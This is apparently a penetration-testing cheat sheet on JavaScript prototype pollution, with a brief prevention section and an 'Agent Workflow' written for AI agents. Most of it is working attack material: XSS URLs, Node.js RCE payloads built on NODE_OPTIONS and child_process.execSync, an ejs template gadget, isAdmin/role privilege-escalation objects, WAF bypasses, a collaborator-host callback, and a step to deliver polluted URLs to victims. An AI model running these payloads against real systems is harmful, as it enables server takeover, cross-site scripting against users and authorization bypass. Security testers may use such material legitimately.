# Prototype Pollution

> **Summary**: Prototype pollution is a JavaScript vulnerability where an attacker injects properties into global object prototypes (`Object.prototype`), affecting all objects in the application.
> **Impact**: Cross-site scripting (XSS) via client-side PP, remote code execution (RCE) via server-side PP, denial of service, authentication bypass, privilege escalation.
> **Typical Severity**: High (client-side XSS) | Critical (server-side RCE)

---

## Detection

### Indicators
- Application uses recursive merge, deep clone, or extend functions on user-controlled objects
- JavaScript frameworks with known PP sinks (Express, Lodash, jQuery, ejs, pug, Handlebars)
- JSON body parsing that feeds directly into merge/clone operations

### Automated Detection
- **Burp Suite DOM Invader** -- dedicated Prototype Pollution tab, auto-mutates `__proto__` and `constructor.prototype`
- **PPScan** (browser extension) -- scans pages you visit for client-side PP: `https://github.com/msrkp/PPScan`
- **ppmap** -- finds PP vulnerabilities and known gadgets: `https://github.com/kleiton0x00/ppmap`
- **ppfuzz** -- fuzzer for client-side PP (supports ESM, HTTP/2, WebSocket): `https://github.com/dwisiswant0/ppfuzz`
- **proto-find** -- `https://github.com/kosmosec/proto-find`
- **Server-Side Prototype Pollution Scanner** (Burp extension by PortSwigger)

### Manual Detection

#### Client-Side
```javascript
// In browser console -- pollute and check
Object.prototype.testpollution = "polluted";
// Then check if the app behavior changes or if "testpollution" appears in unexpected places

// Using URL parameters:
// https://<TARGET>/?__proto__[testpollution]=polluted
// https://<TARGET>/?constructor.prototype.testpollution=polluted
// https://<TARGET>/#__proto__[testpollution]=polluted
```

#### Server-Side (Safe Probing via Express Gadgets)
```json
// JSON spaces -- adds extra space to JSON responses (non-destructive)
{"__proto__":{"json spaces":" "}}

// Status code override -- changes response status
{"__proto__":{"status":510}}

// Exposed headers -- adds CORS header
{"__proto__":{"exposedHeaders":["foo"]}}

// OPTIONS method hiding
{"__proto__":{"head":true}}

// Content-type override (confirms pollution)
{"__proto__":{"content-type":"application/json; charset=utf-7"}}
```

#### Debugging Property Access
```javascript
// Set a breakpoint when a polluted property is read
Object.defineProperty(Object.prototype, '<PROPERTY_NAME>', {
    __proto__: null,
    get() {
        console.trace();
        return 'test';
    }
});
```

---

## Exploitation

### Prerequisites
1. A merge, clone, extend, or deep-set function that does not filter `__proto__` or `constructor`
2. User-controlled input reaches the vulnerable function (JSON body, query params, URL hash)
3. For RCE: a code path that spawns child processes after the pollution occurs

### Step-by-Step

1. **Identify the sink** -- find merge/clone/extend operations that accept user input
   - Success criteria: locate the vulnerable function in source code or via automated tool
2. **Confirm pollution** -- inject a benign property and verify it propagates
   - Success criteria: `({}).testpollution === "polluted"` returns true
3. **Find a gadget** -- identify code that reads from `Object.prototype` and performs a sensitive action
   - Success criteria: DOM manipulation (client) or process spawning (server) triggered
4. **Exploit the gadget** -- craft a payload that chains pollution with the gadget for XSS or RCE
   - Success criteria: JavaScript execution in browser or OS command execution on server

### Client-Side PP to XSS

#### Via innerHTML/srcdoc Gadgets
```javascript
// Pollute via URL:
// https://<TARGET>/?__proto__[innerHTML]=<img/src/onerror=alert(1)>
// https://<TARGET>/?__proto__[srcdoc]=<script>alert(1)</script>
```

#### Via HTML Sanitizer Bypass
```javascript
// DOMPurify bypass (pre-patch versions)
Object.prototype.ALLOWED_TAGS = ['img'];
Object.prototype.ALLOW_DATA_ATTR = true;

// sanitize-html bypass
{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}

// Closure sanitizer bypass
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
```

#### Via Express (Server Reflects HTML)
```json
// Pollute body and _body to make Express serve HTML instead of JSON
{"__proto__":{"_body":true,"body":"<script>alert(document.domain)</script>"}}
```

### Server-Side PP to RCE (Node.js)

#### Via NODE_OPTIONS + /proc/self/environ (fork/spawn gadget)
```json
{
  "__proto__":{
    "NODE_OPTIONS":"--require /proc/self/environ",
    "env":{
      "EVIL":"require('child_process').execSync('id').toString()//"
    }
  }
}
```

#### Via NODE_OPTIONS + /proc/self/cmdline
```json
{
  "__proto__":{
    "NODE_OPTIONS":"--require /proc/self/cmdline",
    "argv0":"require('child_process').execSync('id').toString()//"
  }
}
```

#### Via --import data URI (Node >= 19, no filesystem needed)
```json
{
  "__proto__":{
    "NODE_OPTIONS":"--import data:text/javascript;base64,<BASE64_PAYLOAD>"
  }
}
```

#### DNS-Based Detection (confirm PP2RCE blind)
```json
{
  "__proto__":{
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=<BURP_COLLABORATOR>"
  }
}
```

### Proof of Concept
```bash
# Target: Express app with vulnerable lodash.merge on POST /api/settings
curl -X POST http://<TARGET>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":"  "}}'

# Verify: subsequent JSON responses have double-spaced formatting
curl http://<TARGET>/api/data
# Expected: {"key":  "value"}  (note extra space)
```

---

## Bypasses

### Alternative Pollution Vectors
```javascript
// When __proto__ is filtered:
{"constructor":{"prototype":{"polluted":"yes"}}}

// Via Object.assign with spread:
Object.assign({}, JSON.parse(userInput))

// Via query string with allowDots (Express/qs):
?constructor.prototype.polluted=yes

// Via array index pollution:
{"__proto__":{"0":"malicious"}}
```

### WAF Bypass
```javascript
// Unicode escaping
{"__pro\u0074o__":{"polluted":"yes"}}

// Mixed case (some parsers)
{"__PROTO__":{"polluted":"yes"}}

// Nested constructor path
{"constructor":{"constructor":{"prototype":{"polluted":"yes"}}}}
```

---

## Escalation

### PP to RCE in Popular Libraries

| Library | Gadget | Payload |
|---------|--------|---------|
| **ejs** | `opts.outputFunctionName` | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('<CMD>');//"}}` |
| **pug** | `block.type = "Code"` | Pollute `block` properties to inject code into template compilation |
| **Handlebars** | `allowProtoMethodsByDefault` | `{"__proto__":{"allowProtoMethodsByDefault":true}}` then use `{{#with this}}` |
| **express-handlebars** | `layout` | `{"__proto__":{"layout":"/etc/passwd"}}` -- path traversal via layout resolution |
| **lodash < 4.17.21** | `_.merge()` / `_.set()` | Classic recursive merge pollution |

### PP to Privilege Escalation
```json
// Override isAdmin / role checks
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"verified":true}}
```

### PP to DoS
```json
// Override toString to crash serialization
{"__proto__":{"toString":null}}

// Pollute length to break iterations
{"__proto__":{"length":0}}
```

---

## Where to Find PP

- **Deep merge functions**: `lodash.merge`, `lodash.defaultsDeep`, `lodash.set`, `jQuery.extend(true, ...)`, `hoek.merge`
- **JSON parsing + merge**: `JSON.parse()` output fed into a merge/clone
- **Query string parsers**: `qs` library with `allowDots`, `querystring.parse`
- **URL hash parsing**: `location.hash` parsed into an object
- **Form deserialization**: `body-parser` feeding into vulnerable middleware
- **GraphQL resolvers**: arguments merged into context objects
- Related to [Mass Assignment](mass-assignment.md) -- similar concept at a different abstraction level

---

## Tools

| Tool | Usage |
|------|-------|
| [ppmap](https://github.com/kleiton0x00/ppmap) | `ppmap -url "https://<TARGET>"` |
| [PPScan](https://github.com/msrkp/PPScan) | Browser extension -- passive scanning |
| [ppfuzz](https://github.com/dwisiswant0/ppfuzz) | `ppfuzz -l urls.txt` |
| [proto-find](https://github.com/kosmosec/proto-find) | Automated client-side PP discovery |
| [Burp DOM Invader](https://portswigger.net) | Built-in prototype pollution tab |
| [Server-Side PP Scanner](https://portswigger.net/research/server-side-prototype-pollution) | Burp extension for safe server-side probing |
| [NodeJsScan](https://github.com/ajinabraham/nodejsscan) | SAST for Node.js -- detects PP sinks |

---

## Prevention

- Freeze the prototype early: `Object.freeze(Object.prototype)`
- Create objects without prototype: `Object.create(null)`
- Validate user input against a whitelist of allowed properties
- Use `Map` instead of plain objects for key-value data
- Use `structuredClone()` instead of custom deep-merge functions
- Upgrade vulnerable libraries: lodash >= 4.17.22, deepmerge >= 5.3.0
- Use `Object.hasOwn()` checks instead of `in` operator

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. **Client-side**: Inspect JavaScript files on `<TARGET>` for prototype pollution sinks: `lodash.merge`, `lodash.defaultsDeep`, `lodash.set`, `jQuery.extend(true, ...)`, `Object.assign`, custom recursive merge/deep-clone functions
2. **Client-side**: Use Burp DOM Invader (enable Prototype Pollution tab) to automatically scan for PP as you browse `<TARGET>`
3. **Client-side**: Test URL parameters for PP injection:
   ```
   https://<TARGET>/?__proto__[testpollution]=polluted
   https://<TARGET>/?constructor.prototype.testpollution=polluted
   https://<TARGET>/#__proto__[testpollution]=polluted
   ```
4. **Server-side**: Identify JSON API endpoints that accept user-controlled objects (POST/PUT with JSON body)
5. **Server-side**: Look for Node.js/Express backends (check `X-Powered-By: Express`, error stack traces)
6. Run automated scanners: `ppmap -url "https://<TARGET>"`, `ppfuzz -l urls.txt`
7. Install Server-Side Prototype Pollution Scanner Burp extension for safe server-side probing

### Phase 2: Validation
1. **Client-side confirmation**: Open browser console and check if the polluted property exists:
   ```javascript
   // After visiting https://<TARGET>/?__proto__[testpollution]=polluted
   console.log(({}).testpollution); // Should output "polluted" if vulnerable
   ```
2. **Server-side safe probing via Express gadgets**: Send JSON payloads that produce observable but non-destructive side effects:
   ```json
   {"__proto__":{"json spaces":"  "}}
   ```
   Then check if subsequent JSON responses have extra indentation
3. **Server-side status code probe**:
   ```json
   {"__proto__":{"status":510}}
   ```
   Check if the response status changes to 510
4. If `__proto__` is filtered, try `constructor.prototype`:
   ```json
   {"constructor":{"prototype":{"testpollution":"yes"}}}
   ```
5. **Client-side gadget identification**: Use DOM Invader's gadget scanner or manually search for code that reads undefined properties from objects and uses them in sensitive operations (innerHTML, eval, document.write)

### Phase 3: Exploitation
1. **Client-side PP to XSS**: Identify a DOM gadget and craft a URL that pollutes the prototype to trigger XSS:
   ```
   https://<TARGET>/?__proto__[innerHTML]=<img/src/onerror=alert(document.domain)>
   https://<TARGET>/?__proto__[srcdoc]=<script>alert(1)</script>
   ```
2. **Server-side PP to RCE** (Node.js): If the application spawns child processes after the pollution point, inject via environment gadgets:
   ```json
   {"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('<CMD>')//"}}}
   ```
3. **PP to privilege escalation**: Pollute authorization-related properties:
   ```json
   {"__proto__":{"isAdmin":true}}
   {"__proto__":{"role":"admin"}}
   ```
4. **PP via template engine gadgets**: For ejs, pug, or Handlebars backends, exploit known gadget chains for RCE:
   ```json
   {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('<CMD>');//"}}
   ```
5. Use DNS-based detection for blind server-side PP: `{"__proto__":{"NODE_OPTIONS":"--inspect=<COLLABORATOR>"}}`

### Phase 4: Escalation
1. **Client-side PP to XSS**: deliver the polluted URL to victims for client-side JavaScript execution
2. **Server-side PP to RCE**: achieve OS command execution on the server via `child_process` gadgets
3. **Privilege escalation**: bypass `isAdmin`, `role`, or `verified` checks by polluting the prototype with elevated values
4. **DoS**: pollute `toString`, `valueOf`, or `length` to crash serialization or iteration logic
5. Chain with [XSS](xss.md): PP provides the XSS payload delivery mechanism via DOM gadgets
6. Chain with [Mass Assignment](mass-assignment.md): PP operates at the prototype level, complementing object-level mass assignment attacks

## Decision Tree

```
Identify JavaScript merge/clone/extend operations on user input
├── Client-side PP
│   ├── Test ?__proto__[test]=polluted in URL
│   │   ├── ({}).test === "polluted"? → Client-side PP confirmed
│   │   │   ├── Find DOM gadget (innerHTML, srcdoc, eval, document.write)
│   │   │   │   ├── Gadget found → PP to XSS
│   │   │   │   └── No gadget → Lower impact (DoS, logic manipulation)
│   │   │   └── Try constructor.prototype if __proto__ filtered
│   │   └── Not polluted → Try hash fragment, JSON body, WebSocket
│   └── Run DOM Invader / ppmap for automated discovery
├── Server-side PP
│   ├── Test {"__proto__":{"json spaces":"  "}} on JSON endpoints
│   │   ├── JSON formatting changes? → Server-side PP confirmed
│   │   │   ├── App spawns child processes? → PP to RCE via NODE_OPTIONS
│   │   │   ├── App uses ejs/pug/Handlebars? → PP to RCE via template gadgets
│   │   │   ├── App checks isAdmin/role? → PP to privilege escalation
│   │   │   └── None of the above → DoS or logic manipulation
│   │   └── No change → Try {"constructor":{"prototype":{"json spaces":"  "}}}
│   └── Run Server-Side PP Scanner Burp extension
└── No PP sinks found → Not vulnerable
```

## Success Criteria
- **Client-side**: `({}).testpollution === "polluted"` evaluates to true in the browser console after visiting a crafted URL, confirming prototype pollution; for XSS, JavaScript executes via a DOM gadget
- **Server-side**: observable side effect confirms pollution (changed JSON formatting, altered status code, added CORS header); for RCE, OS command output is received (e.g., via DNS/HTTP callback to `<COLLABORATOR>`)
- The pollution persists and affects application behavior beyond the initial injection point

---

## References

- [PortSwigger -- Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [PortSwigger -- Widespread Prototype Pollution Gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [BlackFan -- Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [Securitum -- Prototype Pollution RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [SonarSource -- BlitzJS Prototype Pollution](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
- [HoLyVieR -- JS Prototype Pollution in NodeJS (PDF)](https://raw.githubusercontent.com/HoLyVieR/prototype-pollution-nsec18/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
- [Gadget Inspector](https://github.com/nicktate/pp-gadgets)
- Related: [XSS](xss.md) | [Mass Assignment](mass-assignment.md)
